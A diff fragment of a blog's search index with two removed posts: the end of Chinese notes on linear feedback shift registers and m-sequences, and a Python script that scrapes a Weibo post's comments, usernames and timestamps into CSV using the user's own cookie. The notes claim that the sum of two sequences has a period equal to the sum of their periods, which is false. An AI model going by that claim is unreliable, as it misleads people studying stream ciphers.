-f(x)=x^n−{\sum_{i=1}^{n}(c_ix^i)}</script><p>同时，我们定义其互反多项式为</p>
-<script type="math/tex; mode=display">
-\overline{f_{(x)}}=1-x^nf(\frac{1}{x})</script><p>我们也称互反多项式为线性反馈移位寄存器的联结多项式。</p>
-<h3 id="特征多项式和生成函数"><a href="#特征多项式和生成函数" class="headerlink" title="特征多项式和生成函数"></a>特征多项式和生成函数</h3><p>特征多项式</p>
-<script type="math/tex; mode=display">
-P(x)=1+c_1x+c_2x^2+...+c_nx^n</script><h3 id="序列周期与生成函数"><a href="#序列周期与生成函数" class="headerlink" title="序列周期与生成函数"></a>序列周期与生成函数</h3><p>序列的的周期为其生成函数的既约真分式的分母的周期。</p>
-<script type="math/tex; mode=display">
-对于 n 级线性反馈移位寄存器，最长周期为 2^n−1（排除全零）。达到最长周期的序列一般称为 m 序列。</script><ul>
-<li>将两个序列累加得到新的序列的周期为这两个序列的周期的和。</li>
-<li>序列是 n 级 m 序列，当且仅当序列的极小多项式是 n 次本原多项式。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>cryptography</category>
-      </categories>
-      <tags>
-        <tag>流密码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python微博评论爬取</title>
-    <url>/2021/06/04/Python%E7%88%AC%E8%99%AB/</url>
-    <content><![CDATA[<h1 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h1><ul>
-<li>用于爬取某一具体微博的所有评论</li>
-<li>通过<a href="https://m.weibo.com/">https://m.weibo.com</a> 查看指定微博id号</li>
-<li>修改cookie</li>
-</ul>
-<h1 id="Source-code"><a href="#Source-code" class="headerlink" title="Source_code"></a>Source_code</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> requests.sessions <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化参数说明：填入自己cookie、以及被爬取微博id即可</span></span><br><span class="line">weibo_id=<span class="number">4643338235416902</span>   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;Your_own_cookie&#x27;</span><span class="comment">#设置为自己的cookie</span></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span> : <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://m.weibo.cn/detail/4635403158556543&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-XSRF-TOKEN&#x27;</span> : <span class="string">&#x27;5c0faa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;MWeibo-Pwa&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;微博评论.csv&quot;</span>,mode =<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">csvwriter = csv.writer(f)</span><br><span class="line"><span class="comment">#打开csv文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id_type=0&quot;</span>.<span class="built_in">format</span>(weibo_id,weibo_id)</span><br><span class="line">session = requests.Session()</span><br><span class="line">resp = session.get(url, headers=headers)</span><br><span class="line"><span class="built_in">dict</span> = resp.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>])):</span><br><span class="line">    comment = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">    name = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;screen_name&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    csvwriter.writerow([name,comment])</span><br><span class="line"></span><br><span class="line">max_id_type =  <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id_type&#x27;</span>]</span><br><span class="line">max_id = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;now max_id=&quot;</span>+<span class="built_in">str</span>(max_id))</span><br><span class="line">flag_ok=<span class="built_in">dict</span>[<span class="string">&#x27;ok&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(flag_ok)</span><br><span class="line">flag_time=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(flag_ok==<span class="number">1</span> <span class="keyword">and</span> max_id!=<span class="number">0</span>):</span><br><span class="line">    url = <span class="string">&quot;https://m.weibo.cn/comments/hotflow?id=&#123;&#125;&amp;mid=&#123;&#125;&amp;max_id=&#123;&#125;&amp;max_id_type=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(weibo_id,weibo_id,max_id,max_id_type)</span><br><span class="line">    resp = session.get(url,headers=headers)</span><br><span class="line">    <span class="built_in">dict</span> = resp.json()</span><br><span class="line">    flag_time= flag_time+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(flag_time==<span class="number">10</span>):</span><br><span class="line">        flag_time=<span class="number">0</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Now relax for 2s to avoid 反扒机制. Be patient :)&quot;</span>)</span><br><span class="line">    flag_ok=<span class="built_in">dict</span>[<span class="string">&#x27;ok&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;now max_id=&quot;</span>+<span class="built_in">str</span>(max_id))</span><br><span class="line">    <span class="keyword">if</span>(flag_ok==<span class="number">1</span>):</span><br><span class="line">        max_id = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id&#x27;</span>]</span><br><span class="line">        max_id_type =  <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;max_id_type&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>])):</span><br><span class="line">            comment = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">            name = <span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;screen_name&#x27;</span>]  </span><br><span class="line">            wb_time=<span class="built_in">dict</span>[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>][j][<span class="string">&#x27;created_at&#x27;</span>]</span><br><span class="line">            csvwriter.writerow([name,comment,wb_time])</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-        <tag>爬虫</tag>
       </tags>
   </entry>
 </search>
